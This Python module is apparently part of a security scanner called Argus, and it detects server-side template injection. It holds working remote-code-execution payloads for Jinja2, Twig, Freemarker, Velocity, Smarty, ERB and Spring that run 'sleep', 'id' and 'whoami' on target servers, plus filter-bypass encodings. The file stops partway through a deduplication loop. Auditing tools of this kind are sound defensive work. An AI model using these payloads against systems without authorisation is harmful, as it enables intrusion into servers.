#!/usr/bin/env python3
"""
auditing_tools/ssti_finder.py — Server-Side Template Injection Auditor (v3)
═══════════════════════════════════════════════════════════════════════════════

Comprehensive SSTI detection for Argus.

v3 fixes 9 bugs in v2 and adds full infra integration.

  Bugs fixed:
    1. test_polyglot() called _safe_request(session, GET="GET", url=...)
       → TypeError on every probe. Entire module was dead-on-arrival.
    2. _inject_query safe list included & and = — broke any payload with
       those chars (params split mid-payload).
    3. Baseline lacked "preexisting proof pattern" check — pages that
       already contain uid=1000 falsely matched the escalation proof.
    4. Blind Jinja2 payload used __subclasses__()[{idx}] with idx="0" —
       always the wrong class. Removed; kept os.system('sleep') variant.
    5. __subclasses__ index hard-coded to 0. v3 tries common indices.
    6. _similarity() was dead code — removed.
    7. Fingerprint tree: "Twig_or_Smarty" fell through to "Jinja2"
       wrongly. v3 respects the ambiguity and tries both engines for
       escalation.
    8. Baseline arithmetic check only rejected the preexisting number,
       not preexisting "49"-like tokens in different contexts. v3 adds
       unique-number verification via {{31137*31137}} when ambiguous.
    9. No denial-marker check — soft "blocked" responses counted as
       arithmetic hits (if they happened to echo "49" in the error).

  Infra added:
    • Config integration (MODULE_RATE_LIMITS["ssti"], ACTIVE_HEADERS)
    • SharedRateLimiter + Session (no burst under concurrency)
    • scan_id support + _self_sync() → dedicated `ssti_findings` table
    • _db_now() for MySQL-safe timestamps
    • finding_hash + auth_enabled + first_seen fields
    • Parallel surface testing (ThreadPoolExecutor + rate limiter)
    • POST body surface discovery from site_pages.json
    • Engine tracking per surface even when no finding
    • Safe-list fix: query params encode &, =, # which previously
      broke payloads mid-transmission

Five-phase detection (unchanged in spirit):

  Phase 1 — Polyglot arithmetic (49 / 7777777 / unique verify)
  Phase 2 — Engine fingerprinting (Jinja2 vs Twig vs Freemarker etc.)
  Phase 3 — Blind timing (sleep via engine-specific RCE chains)
  Phase 4 — WAF bypass variants (hex/octal/unicode/chr/attr/bracket)
  Phase 5 — Escalation proof (non-destructive `id` / `whoami`)

Outputs (into `outdir`):
  • ssti_findings.json
  • ssti_candidates.txt
  • ssti_confirmed.txt
  • ssti_engine.txt

Integration:
  main.py → run_one("ssti") → run_ssti_scan(urls_file, outdir,
                                            scan_id=_CURRENT_SCAN_ID)
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import statistics
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssti_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _ssti_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("ssti", {})
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 300),
        "blind":        entry.get("blind", True),
        "escalation":   entry.get("escalation", True),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT      = 12
BASELINE_SAMPLES     = 3
REQUEST_SLEEP        = 0.08
BLIND_DELAY_SECONDS  = 5
BLIND_TOLERANCE      = 0.65
BLIND_ATTEMPTS       = 3
BLIND_AGREEMENT      = 2
MAX_URLS             = 5000
UNIQUE_MULT_VERIFY   = 31137        # 31137^2 = 969512769 (unlikely preexisting)
UNIQUE_MULT_RESULT   = "969512769"

# Polyglot probes — (label, payload, expected_literal)
POLYGLOT_PROBES = [
    ("jinja_twig",     "{{7*7}}",         "49"),
    ("freemarker",     "${7*7}",          "49"),
    ("erb_ejs",        "<%= 7*7 %>",      "49"),
    ("spring_spel",    "${{7*7}}",        "49"),
    ("pug_ruby",       "#{7*7}",          "49"),
    ("spring_ognl",    "*{7*7}",          "49"),
    ("thymeleaf",      "@{7*7}",          "49"),
    ("smarty",         "{7*7}",           "49"),
]

# Universal polyglot — never has expected value; error-driven only
UNIVERSAL_PROBE = ("universal", "${{<%[%'\"}}%\\")

# Unique variants for ambiguous "49 in preexisting numbers" cases
UNIQUE_VERIFY_MAP = {
    "jinja_twig":  ("{{31137*31137}}",        UNIQUE_MULT_RESULT),
    "freemarker":  ("${31137*31137}",         UNIQUE_MULT_RESULT),
    "erb_ejs":     ("<%= 31137*31137 %>",     UNIQUE_MULT_RESULT),
    "spring_spel": ("${{31137*31137}}",       UNIQUE_MULT_RESULT),
    "pug_ruby":    ("#{31137*31137}",         UNIQUE_MULT_RESULT),
    "spring_ognl": ("*{31137*31137}",         UNIQUE_MULT_RESULT),
    "thymeleaf":   ("@{31137*31137}",         UNIQUE_MULT_RESULT),
    "smarty":      ("{31137*31137}",          UNIQUE_MULT_RESULT),
}

# Engine error signatures
ENGINE_ERROR_SIGNATURES = {
    "Jinja2":     [r"jinja2\.exceptions", r"jinja2"],
    "Twig":       [r"Twig_Error", r"twig"],
    "Freemarker": [r"freemarker\.", r"FreeMarker"],
    "Velocity":   [r"velocity\.", r"Velocity"],
    "Smarty":     [r"Smarty", r"smarty"],
    "ERB":        [r"ERB", r"erb\.exceptions"],
    "Thymeleaf":  [r"Thymeleaf", r"thymeleaf"],
    "Mako":       [r"Mako", r"mako\.exceptions"],
    "Spring":     [r"SpelEvaluationException", r"SpEL", r"org\.springframework\.expression"],
}

# Blind payloads — engine-specific timing RCE
BLIND_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].system('sleep {d}')}}",
        "{{lipsum.__globals__['os'].system('sleep {d}')}}",
        "{{cycler.__init__.__globals__.os.system('sleep {d}')}}",
    ],
    "Twig": [
        "{{['sleep {d}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sleep {d}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep {d}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("sleep {d}")',
    ],
    "Smarty": [
        '{system("sleep {d}")}',
    ],
    "ERB": [
        "<%= system('sleep {d}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('sleep {d}')}",
    ],
}

# Escalation proof — non-destructive commands only
PROOF_COMMANDS = ["id", "whoami", "hostname"]

PROOF_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
        "{{lipsum.__globals__.os.popen('{cmd}').read()}}",
        "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
    ],
    "Twig": [
        "{{['{cmd}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("{cmd}")',
    ],
    "Smarty": [
        '{system("{cmd}")}',
    ],
    "ERB": [
        "<%= `{cmd}` %>",
        "<%= system('{cmd}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('{cmd}')}",
    ],
}

# Proof patterns per engine — matches any command output signature
PROOF_PATTERNS_GLOBAL = [
    r"uid=\d+\([^)]+\)",
    r"gid=\d+\([^)]+\)",
    r"\broot\b",
    r"\bwww-data\b",
    r"\bnobody\b",
    r"\bnginx\b",
    r"\bapache\b",
]

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid input",
    "input rejected", "malicious", "waf", "sanitized",
    "not permitted", "request denied",
)

PROOF_ENGINES = tuple(PROOF_PAYLOADS.keys())


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    median_time: float = 0.0
    time_stddev: float = 0.0
    preexisting_numbers: set[str] = field(default_factory=set)
    preexisting_proof_patterns: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "time_stddev": round(self.time_stddev, 3),
            "preexisting_numbers": sorted(self.preexisting_numbers),
            "preexisting_proof_patterns": sorted(self.preexisting_proof_patterns),
        }


@dataclass
class SSTIFinding:
    target: str
    param: str
    technique: str                  # arithmetic | error | blind | proof
    severity: str = "MEDIUM"
    confidence: int = 50
    confirmed: bool = False
    engine: str = ""
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    param_location: str = "query"
    http_status: int = 0
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.param}|{self.technique}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "engine":         self.engine,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "http_status":    self.http_status,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  SHARED RATE LIMITER + SESSION
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self._last = 0.0
        self._lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            elapsed = time.monotonic() - self._last
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self._last = time.monotonic()


class Session:
    def __init__(self, limiter: SharedRateLimiter, headers: dict, timeout: int):
        self.session = requests.Session()
        self.session.verify = False
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-SSTI-Auditor/2.0")
        self._limiter = limiter
        self.timeout = timeout

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._limiter.wait()
        try:
            return self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _inject_query(url: str, param: str, payload: str) -> str:
    """
    Replace one param's value. The safe list keeps template chars literal
    but ENCODES &, =, # — the v2 bug that split payloads mid-string.
    """
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe="%{}<>*$"))
    )


def _body(resp: Optional[requests.Response], limit: int = 200_000) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _extract_numbers(body: str) -> set[str]:
    return set(re.findall(r"\b\d{1,12}\b", body))


def _extract_proof_patterns(body: str) -> set[str]:
    found: set[str] = set()
    for pat in PROOF_PATTERNS_GLOBAL:
        for m in re.finditer(pat, body, re.I):
            found.add(m.group(0).lower())
    return found


def _fingerprint_error(body: str) -> str:
    for engine, sigs in ENGINE_ERROR_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return engine
    return ""


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    if resp is None:
        return True
    if 200 <= resp.status_code < 300:
        body_low = _body(resp).lower()[:2000]
        return any(m in body_low for m in DENIAL_MARKERS)
    return False


def _engines_to_try(engine: str) -> list[str]:
    """Resolve ambiguous fingerprints into a list of concrete engines."""
    if not engine:
        return []
    if engine in PROOF_PAYLOADS:
        return [engine]
    if engine == "Twig_or_Smarty":
        return ["Twig", "Smarty"]
    if engine == "Jinja2_Twig":
        return ["Jinja2", "Twig"]
    return []


def _probe(session: Session, surface: dict, payload: str,
           timeout: Optional[int] = None) -> Optional[requests.Response]:
    if surface["location"] == "query":
        url = _inject_query(surface["url"], surface["param"], payload)
        return session.get(url, **({"timeout": timeout} if timeout else {}))
    if surface["location"] == "body":
        return session.request(
            surface.get("method", "POST"), surface["url"],
            data={surface["param"]: payload},
            **({"timeout": timeout} if timeout else {}),
        )
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname in urllib.parse.parse_qs(parsed.query):
            key = (url, pname, "query")
            if key in seen:
                continue
            seen.add(key)
            surfaces.append({
                "url": url, "param": pname, "location": "query", "method": "GET",
            })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = field_def.get("name") or ""
                if not fname:
                    continue
                key = (action, fname, "body")
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": action, "param": fname,
                    "location": "body", "method": "POST",
                })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: Session, surface: dict) -> Baseline:
    baseline = Baseline(
        url=surface["url"], param=surface["param"],
        location=surface["location"],
    )
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if surface["location"] == "body":
            resp = session.request(
                surface.get("method", "POST"), surface["url"],
                data={surface["param"]: "argusbaseline"},
            )
        else:
            resp = session.get(surface["url"])
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.preexisting_numbers = _extract_numbers(baseline.body)
            baseline.preexisting_proof_patterns = _extract_proof_patterns(baseline.body)
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
        if len(times) > 1:
            baseline.time_stddev = statistics.pstdev(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — POLYGLOT DETECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_polyglot(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSTIFinding]:
    findings: list[SSTIFinding] = []

    for label, payload, expected in POLYGLOT_PROBES:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)

        if expected in body:
            # Ambiguous — is "49" preexisting noise or real evaluation?
            if expected in baseline.preexisting_numbers:
                # Try unique-number variant for confirmation
                unique = UNIQUE_VERIFY_MAP.get(label)
                if unique:
                    u_payload, u_expected = unique
                    u_resp = _probe(session, surface, u_payload)
                    time.sleep(REQUEST_SLEEP)
                    if u_resp and u_expected in _body(u_resp):
                        findings.append(_arith_finding(
                            surface, label, u_payload, u_expected, u_resp,
                            confidence=97, note="unique-number verification",
                        ))
                        return findings
                # Unique failed — don't trust ambiguous "49"
                continue
            findings.append(_arith_finding(
                surface, label, payload, expected, resp,
                confidence=95, note="arithmetic (49)",
            ))
            return findings

        # Error-based — fingerprint engine even without arithmetic confirm
        engine = _fingerprint_error(body)
        if engine:
            findings.append(SSTIFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="error", severity="HIGH", confidence=80,
                confirmed=False, engine=engine, payload=payload,
                http_status=resp.status_code,
                evidence=f"{engine} error triggered by '{label}' probe",
                details={"probe": label, "body_snippet": body[:400]},
            ))
            return findings

    # Universal polyglot — error-driven only
    label, payload = UNIVERSAL_PROBE
    resp = _probe(session, surface, payload)
    time.sleep(REQUEST_SLEEP)
    if resp and not _looks_denied(resp):
        engine = _fingerprint_error(_body(resp))
        if engine:
            findings.append(SSTIFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="error", severity="HIGH", confidence=75,
                confirmed=False, engine=engine, payload=payload,
                http_status=resp.status_code,
                evidence=f"{engine} error triggered by universal polyglot",
                details={"probe": label,
                         "body_snippet": _body(resp)[:400]},
            ))

    return findings


def _arith_finding(
    surface: dict, label: str, payload: str, expected: str,
    resp: requests.Response, *, confidence: int, note: str,
) -> SSTIFinding:
    return SSTIFinding(
        target=surface["url"], param=surface["param"],
        param_location=surface["location"],
        technique="arithmetic", severity="CRITICAL", confidence=confidence,
        confirmed=True, payload=payload,
        http_status=resp.status_code,
        evidence=f"Arithmetic evaluated: '{payload}' → '{expected}' ({note})",
        details={"probe": label, "expected": expected, "note": note,
                 "body_snippet": _body(resp)[:400]},
    )


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ENGINE FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def fingerprint_engine(session: Session, surface: dict) -> str:
    # Branch 1 — {{ }} family (Jinja2/Twig/Smarty/Liquid)
    resp = _probe(session, surface, "{{7*7}}")
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        # String multiplication discriminates Jinja2 from Twig/Smarty
        resp = _probe(session, surface, "{{7*'7'}}")
        time.sleep(REQUEST_SLEEP)
        if resp:
            body = _body(resp)
            if "7777777" in body:
                return "Jinja2"
            if "49" in body:
                return "Twig_or_Smarty"
        # Fallback: {% if %} works in both Jinja2 and Twig
        resp = _probe(session, surface, "{% if 7*7 == 49 %}ARGUS_YES{% endif %}")
        time.sleep(REQUEST_SLEEP)
        if resp and "ARGUS_YES" in _body(resp):
            return "Jinja2_Twig"
        return "Twig_or_Smarty"

    # Branch 2 — ${ } family (Velocity/Freemarker/Java EL)
    resp = _probe(session, surface, "${7*7}")
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        resp = _probe(session, surface, "${7*'7'}")
        time.sleep(REQUEST_SLEEP)
        if resp:
            body = _body(resp)
            if "7777777" in body:
                return "Velocity"     # Velocity supports string mult
            if "<#assign" in body or "<#--" in body:
                return "Freemarker"
        # Freemarker has <#assign>; probe it
        resp = _probe(session, surface, "<#assign x=1>${x}")
        time.sleep(REQUEST_SLEEP)
        if resp and "1" in _body(resp):
            return "Freemarker"
        return "Java_EL"

    # Branch 3 — error-text fingerprint
    for probe in ("{{7*7}}", "${7*7}", "<%= 7*7 %>"):
        resp = _probe(session, surface, probe)
        time.sleep(REQUEST_SLEEP)
        if resp:
            engine = _fingerprint_error(_body(resp))
            if engine:
                return engine
    return ""


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — BLIND / TIME-BASED
# ═════════════════════════════════════════════════════════════════════════════

def test_blind(
    session: Session, surface: dict, baseline: Baseline,
    engine: str = "",
) -> list[SSTIFinding]:
    if engine in BLIND_PAYLOADS:
        families = [engine]
    elif engine == "Twig_or_Smarty":
        families = ["Twig", "Smarty"]
    elif engine == "Jinja2_Twig":
        families = ["Jinja2", "Twig"]
    else:
        families = list(BLIND_PAYLOADS.keys())

    for family in families:
        for template in BLIND_PAYLOADS.get(family, []):
            payload = template.format(d=BLIND_DELAY_SECONDS)
            timings: list[float] = []
            for _ in range(BLIND_ATTEMPTS):
                start = time.monotonic()
                resp = _probe(session, surface, payload,
                              timeout=BLIND_DELAY_SECONDS + 10)
                elapsed = time.monotonic() - start
                if resp is not None:
                    timings.append(elapsed)
                time.sleep(REQUEST_SLEEP)

            if not timings:
                continue

            threshold = baseline.median_time + (BLIND_DELAY_SECONDS * BLIND_TOLERANCE)
            above = sum(1 for t in timings if t >= threshold)

            if above >= BLIND_AGREEMENT:
                return [SSTIFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="blind", severity="CRITICAL", confidence=85,
                    confirmed=True, engine=family, payload=payload,
                    evidence=(
                        f"Repeatable delay: {above}/{len(timings)} probes "
                        f"≥ {threshold:.1f}s (baseline {baseline.median_time:.2f}s)"
                    ),
                    details={
                        "timings": [round(t, 2) for t in timings],
                        "threshold": round(threshold, 2),
                        "delay_seconds": BLIND_DELAY_SECONDS,
                    },
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — WAF BYPASS VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def _bypass_variants(payload: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []

    if "_" in payload:
        out.append((payload.replace("_", "\\x5f"), "hex_underscore"))
        out.append((payload.replace("_", "\\137"), "octal_underscore"))
        out.append((payload.replace("_", "\\u005f"), "unicode_underscore"))

    if ".__" in payload or "__" in payload:
        attr = payload.replace(
            "__class__", "|attr('\\x5f\\x5fclass\\x5f\\x5f')"
        )
        if attr != payload:
            out.append((attr, "attr_filter"))

    bracket = re.sub(r"\.([a-zA-Z_][a-zA-Z0-9_]*)", r"['\1']", payload)
    if bracket != payload:
        out.append((bracket, "bracket_notation"))

    return out


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — ESCALATION PROOF
# ═════════════════════════════════════════════════════════════════════════════

def test_escalation(
    session: Session, surface: dict, baseline: Baseline, engine: str,
) -> list[SSTIFinding]:
    for concrete_engine in _engines_to_try(engine):
        for cmd in PROOF_COMMANDS:
            for template in PROOF_PAYLOADS[concrete_engine]:
                payload = template.format(cmd=cmd)
                resp = _probe(session, surface, payload)
                time.sleep(REQUEST_SLEEP)
                if resp is None or _looks_denied(resp):
                    continue

                body = _body(resp)
                new_matches = _extract_proof_patterns(body) - baseline.preexisting_proof_patterns
                if not new_matches:
                    continue

                sample = sorted(new_matches)[0]
                return [SSTIFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="proof", severity="CRITICAL", confidence=98,
                    confirmed=True, engine=concrete_engine, payload=payload,
                    http_status=resp.status_code,
                    evidence=f"Command output confirmed: '{cmd}' → '{sample}'",
                    details={"command": cmd, "engine": concrete_engine,
                             "matched_patterns": sorted(new_matches),
                             "body_snippet": body[:400]},
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: Session, surface: dict,
    *,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
) -> tuple[Baseline, list[SSTIFinding], str]:
    baseline = build_baseline(session, surface)
    findings: list[SSTIFinding] = []

    # Phase 1 — polyglot
    poly = test_polyglot(session, surface, baseline)
    findings.extend(poly)

    # Phase 2 — engine
    engine = poly[0].engine if poly and poly[0].engine else ""
    if not engine:
        engine = fingerprint_engine(session, surface)

    # Phase 3 — blind (only if polyglot didn't already confirm)
    if test_blind_enabled and not any(f.confirmed for f in poly):
        blind = test_blind(session, surface, baseline, engine)
        findings.extend(blind)
        if blind and not engine:
            engine = blind[0].engine

    # Phase 5 — escalation proof (only if we have a concrete engine)
    if test_escalation_enabled and engine and any(f.confirmed for f in findings):
        proof = test_escalation(session, surface, baseline, engine)
        findings.extend(proof)

    return baseline, findings, engine


# ═════════════════════════════════════════════════════════════════════════════
#  SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[SSTIFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not available")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB is False")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED is False")
        return
    if not DB.available:
        log.warning("  DB sync: bridge client not ready")
        return
    method = getattr(DB, "upsert_ssti_findings", None)
    if method is None:
        log.warning(
            "  DB sync: db.py is missing upsert_ssti_findings() — "
            "add the method to enable dedicated-table sync"
        )
        return
    try:
        payloads = [f.to_dict() for f in findings]
        result = method(scan_id, payloads)
        if result is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {result} SSTI finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssti_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _ssti_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]

    urls = _load_urls(urls_file)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    # ── Discover surfaces
    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen:
            seen.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    log.info(f"  Modes  : blind={test_blind_enabled}  escalation={test_escalation_enabled}")
    log.info("")

    if not surfaces:
        log.warning("  No surfaces to test — writing empty report")
        return _write_empty_report(outdir, urls_file, start, total_input=len(urls))

    limiter = SharedRateLimiter(eff_rate)
    session = Session(limiter, cfg_hdrs, eff_timeout)

    all_findings: list[SSTIFinding] = []
    engine_map: dict[tuple[str, str, str], str] = {}
    results: list[dict] = []

    def _process(surface: dict) -> tuple[dict, list[SSTIFinding], str]:
        try:
            baseline, findings, engine = audit_surface(
                session, surface,
                test_blind_enabled=test_blind_enabled,
                test_escalation_enabled=test_escalation_enabled,
            )
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"], "method": surface.get("method", "GET"),
                "baseline": baseline.to_dict(), "engine": engine,
                "finding_count": len(findings),
            }, findings, engine
        except Exception as e:
            log.debug(f"    error on {surface['url']}: {e}")
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"],
                "error": str(e),
            }, [], ""

    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
    with ThreadPoolExecutor(max_workers=eff_conc) as pool:
        futures = {pool.submit(_process, s): s for s in surfaces}
        done = 0
        for fut in as_completed(futures):
            done += 1
            try:
                result, findings, engine = fut.result()
                results.append(result)
                if engine:
                    engine_map[(result["url"], result["param"], result["location"])] = engine
                if findings:
                    all_findings.extend(findings)
                    top = findings[0]
                    log.info(
                        f"    [{done:>3}/{len(surfaces)}] {top.technique:<10} "
                        f"{top.severity:<8} engine={engine or '?':<16} "
                        f"{result['url'][:40]} param={result['param']}"
                    )
                elif done % 10 == 0:
                    log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
            except Exception as e:
                log.debug(f"    future error: {e}")

    # ── Dedupe
    seen_f: set[tuple] = set()
    deduped: list[SSTIFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen_f:
            seen_f.add(key)
            f.auth_enabled = auth_on
            if not f.first_seen:
                f.first_seen = _db_now()
